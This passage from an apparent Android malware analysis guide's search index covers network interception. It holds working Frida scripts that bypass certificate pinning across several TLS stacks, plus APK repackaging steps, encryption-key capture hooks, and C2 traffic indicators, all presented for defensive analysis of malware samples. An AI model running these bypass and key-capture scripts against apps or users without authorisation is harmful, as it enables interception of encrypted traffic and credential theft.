Java.use(\"javax.net.ssl.SSLContext\");\n\n    var TrustManager = Java.registerClass({\n        name: \"com.bypass.TrustManager\",\n        implements: [X509TrustManager],\n        methods: {\n            checkClientTrusted: function (chain, authType) {},\n            checkServerTrusted: function (chain, authType) {},\n            getAcceptedIssuers: function () {\n                return [];\n            },\n        },\n    });\n\n    var TrustManagers = [TrustManager.$new()];\n    var sslContext = SSLContext.getInstance(\"TLS\");\n    sslContext.init(null, TrustManagers, null);\n    SSLContext.init.overload(\n        \"[Ljavax.net.ssl.KeyManager;\",\n        \"[Ljavax.net.ssl.TrustManager;\",\n        \"java.security.SecureRandom\"\n    ).implementation = function (km, tm, sr) {\n        this.init(km, TrustManagers, sr);\n    };\n\n    try {\n        var CertificatePinner = Java.use(\"okhttp3.CertificatePinner\");\n        CertificatePinner.check.overload(\n            \"java.lang.String\",\n            \"java.util.List\"\n        ).implementation = function (hostname, peerCertificates) {};\n        CertificatePinner.check$okhttp.overload(\n            \"java.lang.String\",\n            \"kotlin.jvm.functions.Function0\"\n        ).implementation = function (hostname, cleanedCertificates) {};\n    } catch (e) {}\n\n    try {\n        var CertPinnerLegacy = Java.use(\"okhttp3.CertificatePinner\");\n        CertPinnerLegacy.check.overload(\n            \"java.lang.String\",\n            \"[Ljava.security.cert.Certificate;\"\n        ).implementation = function (hostname, peerCertificates) {};\n    } catch (e) {}\n\n    try {\n        var TrustManagerImpl = Java.use(\n            \"com.android.org.conscrypt.TrustManagerImpl\"\n        );\n        TrustManagerImpl.verifyChain.implementation = function (\n            untrustedChain,\n            trustAnchorChain,\n            host,\n            clientAuth,\n            ocspData,\n            tlsSctData\n        ) {\n            return untrustedChain;\n        };\n    } catch (e) {}\n\n    try {\n        var PlatformImpl = Java.use(\n            \"com.android.org.conscrypt.Platform\"\n        );\n        PlatformImpl.checkServerTrusted.overload(\n            \"javax.net.ssl.X509TrustManager\",\n            \"[Ljava.security.cert.X509Certificate;\",\n            \"java.lang.String\",\n            \"com.android.org.conscrypt.AbstractConscryptSocket\"\n        ).implementation = function (tm, chain, authType, socket) {};\n    } catch (e) {}\n\n    try {\n        var WebViewClient = Java.use(\"android.webkit.WebViewClient\");\n        WebViewClient.onReceivedSslError.implementation = function (\n            view,\n            handler,\n            error\n        ) {\n            handler.proceed();\n        };\n    } catch (e) {}\n});\n</code></pre> <p>Run with:</p> <pre><code>frida -U -l ssl_bypass.js -f com.target.package\n</code></pre>"},{"location":"reversing/network-analysis/#objection-ssl-pinning-disable","title":"Objection SSL Pinning Disable","text":"<p>Objection provides a one-command bypass that hooks the same classes automatically:</p> <pre><code>objection -g com.target.package explore\n</code></pre> <pre><code>android sslpinning disable\n</code></pre> <p>This hooks <code>TrustManagerImpl</code>, <code>X509TrustManager</code>, <code>SSLContext</code>, <code>OkHttp3 CertificatePinner</code>, and <code>WebViewClient.onReceivedSslError</code>. For most malware samples, this is sufficient. If the sample uses native pinning or a non-standard library, fall back to the manual Frida script above or a framework-specific bypass.</p>"},{"location":"reversing/network-analysis/#ssl-pinning-bypass-by-framework","title":"SSL Pinning Bypass by Framework","text":"<p>Different development frameworks implement SSL pinning at different layers. The universal Frida script above covers native Android apps, but cross-platform frameworks bundle their own TLS stacks and require framework-specific bypass strategies. See Development Frameworks for framework identification and reversing approaches.</p> Framework / Context Pinning Mechanism Bypass Strategy Default Android (NetworkSecurityConfig) XML-declared CA restrictions and <code>&lt;pin-set&gt;</code> Patch <code>res/xml/network_security_config.xml</code> to add <code>&lt;certificates src=\"user\" /&gt;</code>, or install proxy cert as system cert OkHttp <code>CertificatePinner</code> Hash-based certificate chain pinning Frida hook on <code>CertificatePinner.check()</code> and <code>check$okhttp()</code> to return without throwing Retrofit + OkHttp Delegates entirely to OkHttp's <code>CertificatePinner</code> Same as OkHttp -- Retrofit adds no pinning layer of its own Flutter (BoringSSL) Native BoringSSL in <code>libflutter.so</code>, bypasses Java cert store Hook <code>ssl_crypto_x509_session_verify_cert_chain</code> in <code>libflutter.so</code> to force return <code>true</code> React Native Depends on underlying HTTP client (OkHttp on Android) Standard OkHttp hooks usually work. For <code>react-native-ssl-pinning</code>, hook the specific native method WebView <code>WebViewClient.onReceivedSslError</code> callback Hook <code>onReceivedSslError</code> to call <code>handler.proceed()</code> instead of <code>handler.cancel()</code> Certificate Transparency Separate CT log verification after pinning Requires its own bypass -- hook <code>CTLogVerifier</code> or CT policy class. Pinning bypass alone is insufficient <p>Flutter and React Native</p> <p>Flutter apps do not use Java HTTP clients at all. OkHttp/HttpURLConnection Frida hooks have zero effect. You must target the native BoringSSL layer inside <code>libflutter.so</code>. React Native apps typically delegate to OkHttp, so standard Java hooks work, but apps with custom native modules like <code>react-native-ssl-pinning</code> may need additional native-layer hooks.</p> Flutter BoringSSL Pinning Bypass (Frida) <pre><code>var flutterModule = Process.findModuleByName(\"libflutter.so\");\nif (flutterModule) {\n    var resolvedAddress = Module.findExportByName(\n        \"libflutter.so\",\n        \"ssl_crypto_x509_session_verify_cert_chain\"\n    );\n\n    if (!resolvedAddress) {\n        var pattern = \"FF C3 08 00 00 14\";\n        var matches = Memory.scanSync(\n            flutterModule.base,\n            flutterModule.size,\n            pattern\n        );\n        if (matches.length &gt; 0) {\n            resolvedAddress = matches[0].address;\n        }\n    }\n\n    if (resolvedAddress) {\n        Interceptor.attach(resolvedAddress, {\n            onLeave: function (retval) {\n                retval.replace(0x1);\n            },\n        });\n    }\n}\n</code></pre> <p>For packed apps that encrypt the pinning implementation, unpack first using <code>frida-dexdump</code> or the appropriate unpacker before applying bypasses. See packers for details.</p>"},{"location":"reversing/network-analysis/#certificate-pinning-detection-indicators","title":"Certificate Pinning Detection Indicators","text":"<p>Before attempting a bypass, identify whether pinning is present and what type:</p> Indicator What It Means <code>CertificatePinner</code> in decompiled source OkHttp pin-set pinning <code>network_security_config.xml</code> with <code>&lt;pin-set&gt;</code> elements Android declarative pinning Custom <code>X509TrustManager</code> implementation Manual trust validation <code>libflutter.so</code> present in <code>lib/</code> Flutter BoringSSL pinning likely <code>SSL_CTX_set_verify</code> in native <code>.so</code> files Native OpenSSL/BoringSSL pinning Connection fails with <code>SSLHandshakeException</code> when proxied Pinning is active Connection fails with <code>CertPathValidatorException</code> when proxied Cert not trusted (may be user store issue, not pinning) Traffic goes to port 443 but nothing appears in proxy App ignores system proxy -- use transparent proxy with iptables <p>Quick Pinning Check</p> <p>Run the app through the proxy without any bypass. If the app works normally, there is no pinning. If connections fail with SSL errors in logcat, pinning is active. Use <code>adb logcat | grep -i ssl</code> to see the specific error class, which tells you the pinning implementation.</p>"},{"location":"reversing/network-analysis/#ssl-pinning-bypass-by-implementation","title":"SSL Pinning Bypass by Implementation","text":"<p>Different pinning implementations require different bypass strategies. The table below maps each pinning method to its specific bypass.</p> Pinning Implementation Where It Appears Bypass Method Details OkHttp <code>CertificatePinner</code> Most Java/Kotlin apps, majority of Android malware Frida hook on <code>CertificatePinner.check</code> Hook the <code>check</code> overload to return without throwing. See Frida script below. Custom <code>X509TrustManager</code> Apps implementing their own cert validation Frida hook on <code>checkServerTrusted</code> Replace <code>checkServerTrusted</code> to return empty, bypassing the custom validation logic. <code>network_security_config.xml</code> with <code>&lt;pin-set&gt;</code> Apps using Android's built-in pinning declaration Repackage APK with modified XML Decompile with apktool, edit <code>res/xml/network_security_config.xml</code> to remove <code>&lt;pin-set&gt;</code> and add <code>&lt;trust-anchors&gt;</code> for user certs. Reassemble, sign, install. <code>network_security_config.xml</code> domain restrictions Apps restricting cleartext or cert trust per domain Repackage with permissive config Replace the entire config with one that trusts user certs for all domains. Native OpenSSL (<code>libssl.so</code>) NDK apps making direct native TLS calls Frida native hook on <code>SSL_CTX_set_verify</code> Hook <code>SSL_CTX_set_verify</code> in <code>libssl.so</code> and replace the callback with one that always succeeds. BoringSSL in Flutter (<code>libflutter.so</code>) All Flutter apps Patch <code>libflutter.so</code> or use reFlutter Flutter bundles BoringSSL and bypasses the Android cert store entirely. Use reFlutter to patch the binary, or locate <code>ssl_crypto_x509_session_verify_cert_chain</code> with Ghidra and NOP it. See frameworks for details. React Native TLS React Native apps with native pinning modules Java-layer Frida hook or patch JS bundle If pinning is via <code>react-native-ssl-pinning</code>, hook OkHttp at the Java layer. If pinning is in the JS fetch wrapper, patch <code>assets/index.android.bundle</code>. See frameworks. Conscrypt / <code>TrustManagerImpl</code> System default TLS via Conscrypt provider Frida hook on <code>TrustManagerImpl.verifyChain</code> Hook <code>com.android.org.conscrypt.TrustManagerImpl</code> to bypass the platform-level chain validation. Xamarin <code>ServicePointManager</code> Xamarin/.NET MAUI apps Patch the assembly DLL or hook Mono runtime Edit <code>ServerCertificateValidationCallback</code> in the DLL with dnSpy to always return true. See frameworks. Packed apps with pinning Samples protected by commercial packers Unpack first, then apply standard bypass Packers like DexGuard or Virbox may encrypt the pinning implementation. Use <code>frida-dexdump</code> to recover the DEX, then identify and bypass the pinning method. <p>Repackaging <code>network_security_config.xml</code>:</p> <p>Decompile, replace the config, reassemble:</p> <pre><code>apktool d target.apk -o target_patched/\n</code></pre> <p>Write a permissive <code>res/xml/network_security_config.xml</code>:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;network-security-config&gt;\n    &lt;base-config cleartextTrafficPermitted=\"true\"&gt;\n        &lt;trust-anchors&gt;\n            &lt;certificates src=\"system\" /&gt;\n            &lt;certificates src=\"user\" /&gt;\n        &lt;/trust-anchors&gt;\n    &lt;/base-config&gt;\n&lt;/network-security-config&gt;\n</code></pre> <p>If the app's <code>AndroidManifest.xml</code> does not reference this file, add the attribute:</p> <pre><code>&lt;application android:networkSecurityConfig=\"@xml/network_security_config\" ...&gt;\n</code></pre> <pre><code>apktool b target_patched/ -o target_patched.apk\napksigner sign --ks debug.keystore target_patched.apk\nadb install target_patched.apk\n</code></pre>"},{"location":"reversing/network-analysis/#c2-protocol-identification","title":"C2 Protocol Identification","text":"<p>Android malware C2 protocols fall into distinct categories. Identifying the protocol type determines the analysis approach. For detailed C2 implementation patterns, see C2 Communication Techniques.</p> Protocol Indicators Families HTTP/REST Standard HTTP methods, JSON/XML payloads, URL path structure Cerberus, Anubis, GodFather, Rafel RAT WebSocket <code>ws://</code> or <code>wss://</code> URLs, <code>Upgrade: websocket</code> header, persistent connection TsarBot, Antidot, BlankBot, BTMOB RAT, PJobRAT MQTT Port 1883/8883, CONNECT/PUBLISH/SUBSCRIBE packets Copybara Raw TCP Custom binary protocol, non-standard ports Albiriox (unencrypted TCP), SpyNote Firebase Cloud Messaging <code>fcm.googleapis.com</code>, JSON with <code>registration_ids</code> Vultur v2, PJobRAT, KoSpy, FireScam, DeVixor Firebase Firestore <code>firestore.googleapis.com</code>, document reads/writes KoSpy (C2 config delivery) Telegram Bot API <code>api.telegram.org/bot&lt;token&gt;/</code>, <code>sendMessage</code>/<code>getUpdates</code> Rafel RAT, Mamont, DeVixor TOR <code>.onion</code> domains, SOCKS proxy on port 9050 Hydra Dead drop resolvers Pastebin, Telegram channels, X (Twitter) posts containing encoded C2 addresses Medusa v2"},{"location":"reversing/network-analysis/#identifying-the-protocol-from-captured-traffic","title":"Identifying the Protocol from Captured Traffic","text":"<p>When capturing traffic from an unknown sample, use these indicators to classify the C2 channel:</p> <p>HTTP REST patterns: Look for repeated POST requests to the same URL path (e.g., <code>/gate.php</code>, <code>/api/bot</code>, <code>/panel/</code>). Request bodies are typically JSON with fields like <code>bot_id</code>, <code>action</code>, <code>cmd</code>. Responses contain JSON with command instructions. Polling intervals are usually 30--120 seconds. The User-Agent header is often the default OkHttp string or a hardcoded fake browser UA.</p> <p>WebSocket upgrade: A single HTTP request with <code>Connection: Upgrade</code> and <code>Upgrade: websocket</code> headers, followed by a persistent TCP connection. Subsequent traffic is framed WebSocket data. Malware WebSocket traffic is bidirectional -- the server pushes commands without the bot polling. Look for periodic ping/pong frames to maintain the connection.</p> <p>MQTT identification: Connects to port 1883 (unencrypted) or 8883 (TLS). The first packet is an MQTT CONNECT with a client ID (often the bot ID). Subsequent packets are PUBLISH and SUBSCRIBE operations. Wireshark decodes MQTT natively. The topic structure often reveals the botnet organization (e.g., <code>bots/&lt;bot_id&gt;/commands</code>).</p> <p>Telegram Bot API: All requests go to <code>api.telegram.org</code>. URLs contain a bot token in the format <code>bot&lt;numeric_id&gt;:&lt;alphanumeric_key&gt;</code>. Common endpoints: <code>/sendMessage</code>, <code>/getUpdates</code>, <code>/sendDocument</code>, <code>/sendPhoto</code>. The chat ID in request bodies identifies the operator's Telegram account or group.</p> <p>Firebase: Connections to <code>firebaseio.com</code>, <code>fcm.googleapis.com</code>, or <code>firestore.googleapis.com</code>. FCM traffic uses JSON with <code>registration_ids</code> or topic subscriptions. Firestore traffic involves document read/write operations. The Firebase project ID in the hostname identifies the attacker's project.</p> <p>Custom TCP: Non-HTTP traffic on unusual ports. Often has a fixed-size header with a length prefix, command type byte, and binary payload. Use Wireshark's \"Follow TCP Stream\" to examine the raw bytes. Look for repeating structures that indicate a command protocol. SpyNote uses a custom binary protocol on high ports.</p>"},{"location":"reversing/network-analysis/#protocol-analysis-workflow","title":"Protocol Analysis Workflow","text":"<pre><code>1. Capture traffic (proxy or tcpdump)\n2. Identify protocol type from port/headers\n3. For HTTP: decode JSON payloads, map API endpoints\n4. For WebSocket: capture frame-by-frame, decode message format\n5. For custom protocols: identify packet structure (length prefix, command ID, payload)\n6. Map command set: what commands does the C2 send, what does the bot respond\n7. Extract IOCs: domains, IPs, paths, tokens, bot IDs\n</code></pre>"},{"location":"reversing/network-analysis/#common-c2-protocol-patterns","title":"Common C2 Protocol Patterns","text":"<p>Practical breakdown of what each C2 protocol looks like in a network capture, with specific indicators to search for. For implementation-level analysis with code samples and family-specific protocol details, see C2 Communication Techniques.</p>"},{"location":"reversing/network-analysis/#http-rest-polling","title":"HTTP REST Polling","text":"<p>The most common C2 pattern across Android malware. The bot registers on first launch, then polls at a fixed interval for commands.</p> <ul> <li>Repeating POST requests to the same URL path at regular intervals (e.g., <code>/gate.php</code>, <code>/api/bot</code>, <code>/panel/gate</code>)</li> <li>JSON request body with a <code>bot_id</code> or <code>device_id</code> as the primary device identifier</li> <li>Consistent polling interval, typically 15--60 seconds, sometimes dynamically configurable via C2 response</li> <li>First request (registration beacon) is larger than subsequent polls -- contains device info, installed apps, country code</li> <li>Response body contains command IDs/strings when commands are queued, or empty/<code>{\"cmd\":\"idle\"}</code> when not</li> </ul>"},{"location":"reversing/network-analysis/#websocket-persistent-connections","title":"WebSocket Persistent Connections","text":"<p>Used by families that need real-time bidirectional control -- remote access, screen streaming, VNC-like functionality.</p> <ul> <li>HTTP <code>Upgrade: websocket</code> handshake followed by a persistent TCP connection</li> <li>WebSocket frames containing JSON messages or binary screen data</li> <li>Event-driven message types rather than request-response (e.g., <code>{\"type\":\"screen_update\",\"data\":\"...\"}</code>)</li> <li>No polling interval -- commands arrive on demand from the C2</li> <li>Periodic ping/pong frames as keepalive</li> </ul>"},{"location":"reversing/network-analysis/#telegram-bot-api-traffic","title":"Telegram Bot API Traffic","text":"<p>Abuses Telegram's infrastructure as a free, takedown-resistant C2 channel.</p> <ul> <li>HTTPS requests to <code>api.telegram.org/bot&lt;TOKEN&gt;/</code></li> <li>API methods in the URL path: <code>sendMessage</code>, <code>getUpdates</code>, <code>sendDocument</code>, <code>sendPhoto</code></li> <li>Bot token visible in the URL (format: <code>123456789:ABCdefGHIjklMNOpqrsTUVwxyz</code>)</li> <li><code>chat_id</code> parameter in request body identifies the operator's Telegram account</li> <li>Exfiltrated data often sent as document attachments via <code>sendDocument</code></li> </ul>"},{"location":"reversing/network-analysis/#firebase-cloud-messaging-wake-ups","title":"Firebase Cloud Messaging Wake-ups","text":"<p>FCM acts as a wake-up channel rather than the primary C2 transport. The push notification triggers the malware to connect to the actual C2 over HTTP or WebSocket.</p> <ul> <li>Persistent connection to <code>mtalk.google.com</code> (FCM backend)</li> <li>FCM registration token exchange at startup (<code>fcmregistrations.googleapis.com</code>)</li> <li>Push payload may contain the C2 URL, a command trigger, or a \"wake up and poll\" signal</li> <li>Correlate FCM push timing with subsequent HTTP requests to find the actual C2 channel</li> <li>Difficult to intercept at network layer -- hook <code>FirebaseMessagingService.onMessageReceived</code> with Frida instead</li> </ul>"},{"location":"reversing/network-analysis/#dns-tunneling-indicators","title":"DNS Tunneling Indicators","text":"<p>Rare on Android but used by advanced families to bypass HTTP-layer monitoring entirely.</p> <ul> <li>Unusually long subdomain labels containing encoded data (e.g., <code>dGVzdGRhdGE.evil.com</code>)</li> <li>High volume of TXT, CNAME, or NULL record lookups to a single domain</li> <li>Subdomain strings with base32/base64-like character patterns</li> <li>DNS response records containing encoded payloads rather than legitimate IP addresses</li> <li>Query frequency far exceeding normal mobile DNS behavior</li> </ul>"},{"location":"reversing/network-analysis/#heartbeat-intervals-by-family-type","title":"Heartbeat Intervals by Family Type","text":"<p>The polling interval is a useful fingerprint for identifying the malware category during traffic analysis:</p> Interval Range Family Type Rationale Persistent connection (no polling) WebSocket-based RATs: Hook, Medusa, Octo v2 Real-time remote access requires instant command delivery 5--15 seconds Active RATs: SpyNote, BTMOB RAT Interactive remote control with minimal latency 30--60 seconds Banking trojans: Cerberus, Anubis, GodFather Balance between responsiveness and battery/network stealth 60--120 seconds Overlay-focused trojans: Anatsa, Xenomorph Only needs periodic check for new inject targets 5--30 minutes Spyware, stalkerware: LightSpy, KoSpy Long-term surveillance, minimize battery and detection FCM-triggered (no fixed interval) FCM-wakeup families: Ermac, Vultur v2 No polling -- FCM push wakes the bot on demand"},{"location":"reversing/network-analysis/#command-types-visible-in-traffic","title":"Command Types Visible in Traffic","text":"<p>Common command categories and how they appear in captured network traffic:</p> Command Category Traffic Pattern Example Payload Overlay injection C2 sends target app package names and inject page URLs <code>{\"cmd\": \"inj_enable\", \"apps\": [\"com.bank.app\"], \"url\": \"https://...\"}</code> SMS interception Bot forwards intercepted SMS to C2 immediately <code>{\"cmd\": \"sms_log\", \"from\": \"+1555...\", \"body\": \"Your OTP is 123456\"}</code> App list request C2 requests installed apps, bot responds with package list <code>{\"cmd\": \"get_apps\"}</code> response: <code>{\"apps\": [\"com.whatsapp\", ...]}</code> Screen capture C2 requests screenshot, bot responds with Base64 image <code>{\"cmd\": \"screenshot\"}</code> response: <code>{\"img\": \"iVBORw0KGgo...\"}</code> Keylog upload Bot sends accumulated keystrokes periodically <code>{\"cmd\": \"keylog\", \"data\": \"username: john\\npassword: hunter2\"}</code> Contact exfiltration C2 requests contacts, bot dumps full contact list <code>{\"cmd\": \"get_contacts\"}</code> response: <code>{\"contacts\": [{...}]}</code> USSD execution C2 sends USSD code for the bot to dial <code>{\"cmd\": \"ussd\", \"code\": \"*100#\"}</code> Push notification C2 sends notification for social engineering <code>{\"cmd\": \"push\", \"title\": \"Bank Alert\", \"body\": \"...\"}</code> App install/uninstall C2 instructs bot to install APK from URL or remove app <code>{\"cmd\": \"install_app\", \"url\": \"https://...\"}</code> Self-destruct C2 instructs bot to wipe itself <code>{\"cmd\": \"kill_bot\"}</code> or <code>{\"cmd\": \"uninstall\"}</code>"},{"location":"reversing/network-analysis/#exfiltration-upload-indicators","title":"Exfiltration Upload Indicators","text":"<p>Large data uploads stand out in traffic captures. Look for these patterns to identify exfiltration activity:</p> <ul> <li>Sudden spike in upload volume compared to small polling requests</li> <li>Multipart form data with file attachments (screenshots, recordings)</li> <li>SFTP connections to separate servers (Vultur uses SFTP for screen recordings while maintaining HTTP C2)</li> <li>Base64-encoded binary data in JSON payloads (inefficient but common)</li> <li>Telegram <code>sendDocument</code> or <code>sendPhoto</code> API calls with file attachments</li> <li>Repeated large POSTs to a <code>/upload</code> or <code>/data</code> endpoint distinct from the command polling endpoint</li> <li>Chunked transfer encoding for large payloads that exceed typical JSON body sizes</li> </ul>"},{"location":"reversing/network-analysis/#bot-panel-url-fingerprints","title":"Bot Panel URL Fingerprints","text":"<p>C2 panel endpoints often leak information about the malware family or the panel software:</p> URL Pattern Family / Panel Indicator <code>/gate.php</code> Cerberus lineage, Anubis <code>/api/mirrors</code> Anatsa <code>/o/</code> or <code>/observer/</code> GodFather <code>/connect</code> WebSocket upgrade Hook, Medusa Non-standard high port (4000--9999) SpyNote, raw TCP families Firebase project in hostname FireScam, KoSpy <code>/bot&lt;token&gt;/sendMessage</code> Telegram-based C2 (Rafel RAT, Mamont) <code>/api/v1/bot/</code> or <code>/api/v2/bot/</code> Modern panel frameworks (Hook v2, Octo v2) <code>gate.php</code> with <code>action=</code> parameter Classic Anubis/Cerberus panel structure <code>/panel/injects/</code> Separate inject kit hosting server"},{"location":"reversing/network-analysis/#domain-generation-algorithms-dga","title":"Domain Generation Algorithms (DGA)","text":"<p>Some families generate C2 domains algorithmically to resist infrastructure takedown:</p> Family DGA Type Predictability SharkBot Date-seeded domain generation Predictable with algorithm and seed Octo v2 Dynamic key-based DGA Requires key extraction MoqHao DNS hijacking (not DGA, but similar resilience) Requires DNS monitoring <p>To analyze a DGA: extract the algorithm from decompiled code, determine the seed (often date-based), and generate the domain list. This enables preemptive domain sinkholing.</p>"},{"location":"reversing/network-analysis/#exfiltration-channel-analysis","title":"Exfiltration Channel Analysis","text":"<p>Different families exfiltrate stolen data through different channels:</p> Channel What's Sent Families HTTP POST to C2 Credentials, SMS, contacts, device info Most banking trojans SFTP Files, documents, media DCHSpy Telegram Bot Screenshots, keylog dumps, SMS Rafel RAT, Mamont Firebase Realtime Database Real-time data streaming FireScam WebSocket streaming Live screen data, input events Vultur, BTMOB RAT AWS S3 (misconfigured) Exfiltrated victim data RedHook (exposed S3 bucket) VNC/AlphaVNC Screen streaming Vultur v1, BingoMod MediaProjection stream Screen recording/streaming Gigabud, BlankBot, BTMOB RAT"},{"location":"reversing/network-analysis/#traffic-encryption","title":"Traffic Encryption","text":"Encryption How to Decrypt Families Standard HTTPS Proxy with cert install + pinning bypass Most families Custom AES on top of HTTPS Hook <code>Cipher.doFinal</code> to capture plaintext Cerberus lineage Unencrypted HTTP/TCP No decryption needed Albiriox, older families Certificate pinning only Bypass pinning, traffic is readable Anatsa, Xenomorph TOR Run malware through transparent TOR proxy, or hook before TOR encryption Hydra Custom binary encoding Reverse the encoding algorithm from decompiled code Family-specific"},{"location":"reversing/network-analysis/#hooking-javaxcryptocipher-for-plaintext-capture","title":"Hooking javax.crypto.Cipher for Plaintext Capture","text":"<p>When malware applies its own encryption layer on top of HTTPS, the proxy sees encrypted blobs even after TLS termination. Hook <code>javax.crypto.Cipher</code> to capture data before encryption and after decryption.</p> Cipher.doFinal Hook Script <pre><code>Java.perform(function () {\n    var Cipher = Java.use(\"javax.crypto.Cipher\");\n    var ENCRYPT_MODE = 1;\n    var DECRYPT_MODE = 2;\n\n    Cipher.doFinal.overload(\"[B\").implementation = function (input) {\n        var mode = this.getOpmode();\n        var algo = this.getAlgorithm();\n        var result = this.doFinal(input);\n\n        if (mode === ENCRYPT_MODE) {\n            send({\n                type: \"cipher\",\n                direction: \"encrypt\",\n                algorithm: algo,\n                plaintext: bytesToHex(input),\n                ciphertext: bytesToHex(result),\n            });\n        } else if (mode === DECRYPT_MODE) {\n            send({\n                type: \"cipher\",\n                direction: \"decrypt\",\n                algorithm: algo,\n                ciphertext: bytesToHex(input),\n                plaintext: bytesToHex(result),\n            });\n        }\n\n        return result;\n    };\n\n    Cipher.doFinal.overload(\"[B\", \"int\", \"int\").implementation = function (\n        input,\n        offset,\n        length\n    ) {\n        var mode = this.getOpmode();\n        var algo = this.getAlgorithm();\n        var slice = input.slice(offset, offset + length);\n        var result = this.doFinal(input, offset, length);\n\n        send({\n            type: \"cipher\",\n            direction: mode === ENCRYPT_MODE ? \"encrypt\" : \"decrypt\",\n            algorithm: algo,\n            input: bytesToHex(slice),\n            output: bytesToHex(result),\n        });\n\n        return result;\n    };\n\n    function bytesToHex(bytes) {\n        var hex = [];\n        for (var i = 0; i &lt; bytes.length; i++) {\n            hex.push((\"0\" + (bytes[i] &amp; 0xff).toString(16)).slice(-2));\n        }\n        return hex.join(\"\");\n    }\n});\n</code></pre> <p>To see the plaintext as readable strings instead of hex, add a UTF-8 decode:</p> <pre><code>Java.perform(function () {\n    var Cipher = Java.use(\"javax.crypto.Cipher\");\n    var StringClass = Java.use(\"java.lang.String\");\n\n    Cipher.doFinal.overload(\"[B\").implementation = function (input) {\n        var result = this.doFinal(input);\n        var mode = this.getOpmode();\n\n        if (mode === 1) {\n            console.log(\"[ENCRYPT] \" + StringClass.$new(input));\n        } else {\n            console.log(\"[DECRYPT] \" + StringClass.$new(result));\n        }\n\n        return result;\n    };\n});\n</code></pre>"},{"location":"reversing/network-analysis/#hooking-okhttp-interceptors-for-requestresponse-logging","title":"Hooking OkHttp Interceptors for Request/Response Logging","text":"<p>For malware that uses OkHttp (the majority of Android banking trojans), hook the interceptor chain to capture fully formed HTTP requests and responses before any application-layer encryption is applied.</p> OkHttp Request/Response Logger <pre><code>Java.perform(function () {\n    var OkHttpClient = Java.use(\"okhttp3.OkHttpClient\");\n    var Interceptor = Java.use(\"okhttp3.Interceptor\");\n    var Buffer = Java.use(\"okio.Buffer\");\n\n    var LogInterceptor = Java.registerClass({\n        name: \"com.bypass.LogInterceptor\",\n        implements: [Interceptor],\n        methods: {\n            intercept: function (chain) {\n                var request = chain.request();\n                var url = request.url().toString();\n                var method = request.method();\n                var headers = request.headers().toString();\n\n                var requestBody = \"\";\n                if (request.body() !== null) {\n                    var buf = Buffer.$new();\n                    request.body().writeTo(buf);\n                    requestBody = buf.readUtf8();\n                }\n\n                console.log(\"&gt;&gt;&gt; \" + method + \" \" + url);\n                console.log(\"Headers: \" + headers);\n                if (requestBody.length &gt; 0) {\n                    console.log(\"Body: \" + requestBody);\n                }\n\n                var response = chain.proceed(request);\n                var responseBody = response.peekBody(Java.use(\"java.lang.Long\").MAX_VALUE.value);\n                var responseString = responseBody.string();\n\n                console.log(\"&lt;&lt;&lt; \" + response.code() + \" \" + url);\n                console.log(\"Response: \" + responseString);\n\n                return response;\n            },\n        },\n    });\n\n    OkHttpClient.$init.overload(\"okhttp3.OkHttpClient$Builder\").implementation =\n        function (builder) {\n            builder.addInterceptor(LogInterceptor.$new());\n            this.$init(builder);\n        };\n});\n</code></pre>"},{"location":"reversing/network-analysis/#custom-protocol-key-extraction","title":"Custom Protocol Key Extraction","text":"<p>When malware uses a custom encryption scheme, the decryption key must be extracted at runtime. Common patterns:</p> <p>Hardcoded key in code: Search decompiled source for <code>SecretKeySpec</code> construction. The byte array argument is the key.</p> <p>Key derived from device info: Hook the key derivation function to capture the generated key:</p> <pre><code>Java.perform(function () {\n    var SecretKeySpec = Java.use(\"javax.crypto.spec.SecretKeySpec\");\n\n    SecretKeySpec.$init.overload(\"[B\", \"java.lang.String\").implementation = function (\n        keyBytes,\n        algorithm\n    ) {\n        var key = \"\";\n        for (var i = 0; i &lt; keyBytes.length; i++) {\n            key += (\"0\" + (keyBytes[i] &amp; 0xff).toString(16)).slice(-2);\n        }\n        console.log(\"[KEY] \" + algorithm + \": \" + key);\n        return this.$init(keyBytes, algorithm);\n    };\n});\n</code></pre> <p>IV extraction: Hook <code>IvParameterSpec</code> to capture the initialization vector alongside the key:</p> <pre><code>Java.perform(function () {\n    var IvParameterSpec = Java.use(\"javax.crypto.spec.IvParameterSpec\");\n\n    IvParameterSpec.$init.overload(\"[B\").implementation = function (iv) {\n        var hex = \"\";\n        for (var i = 0; i &lt; iv.length; i++) {\n            hex += (\"0\" + (iv[i] &amp; 0xff).toString(16)).slice(-2);\n        }\n        console.log(\"[IV] \" + hex);\n        return this.$init(iv);\n    };\n});\n</code></pre> <p>Key fetched from C2 server: Hook the network layer to capture the key exchange, then hook <code>SecretKeySpec</code> to confirm the derived key.</p> <p>Base64 + XOR encoding: Simpler families XOR the payload with a static key, then Base64-encode. Hook the encoding/decoding function directly, or extract the XOR key from the decompiled source and decode captured traffic in the proxy.</p> <p>Custom binary serialization: Some families use Protobuf, MessagePack, or custom binary formats instead of JSON. Hook the serialization/deserialization methods. For Protobuf, extract the <code>.proto</code> definitions from the decompiled code or reverse them from the wire format using <code>protoc --decode_raw</code>.</p> <p>Hooking at the network layer boundary: Instead of hooking crypto APIs (which capture all crypto operations including non-network ones), hook the app's own network methods. Find the class that builds HTTP requests (typically a class wrapping OkHttp or HttpURLConnection) and hook its send/receive methods to capture plaintext before the app's encryption layer. This is often cleaner because you get structured C2 data rather than raw bytes from every <code>Cipher.doFinal</code> call.</p> <p>Combining Hooks</p> <p>Run the Cipher hook, SecretKeySpec hook, and IvParameterSpec hook together to capture the key, IV, and encrypted/decrypted data simultaneously. This gives you everything needed to write a standalone decryptor for offline analysis of PCAP captures.</p>"},{"location":"reversing/network-analysis/#frida-scripts-for-network-interception","title":"Frida Scripts for Network Interception","text":"<p>For general Frida setup and fundamentals, see Hooking. The scripts below cover network-layer hooks beyond the OkHttp interceptor above. These target alternative HTTP clients, WebSocket C2, native TLS, DNS resolution, and Telegram-based C2.</p>"},{"location":"reversing/network-analysis/#httpurlconnection-hook","title":"HttpURLConnection Hook","text":"<p>Older malware and some families prefer <code>java.net.HttpURLConnection</code> over OkHttp. Hook the connection lifecycle to capture URLs, request methods, and response codes:</p> <pre><code>Java.perform(function() {\n    var URL = Java.use(\"java.net.URL\");\n\n    URL.openConnection.overload().implementation = function() {\n        var conn = this.openConnection();\n        send(\"[URL] \" + this.toString());\n        return conn;\n    };\n\n    var HttpURLConnection = Java.use(\"java.net.HttpURLConnection\");\n\n    HttpURLConnection.getInputStream.implementation = function() {\n        var is = this.getInputStream();\n        send(\"[RESP] \" + this.getURL().toString() + \" code=\" + this.getResponseCode());\n        return is;\n    };\n\n    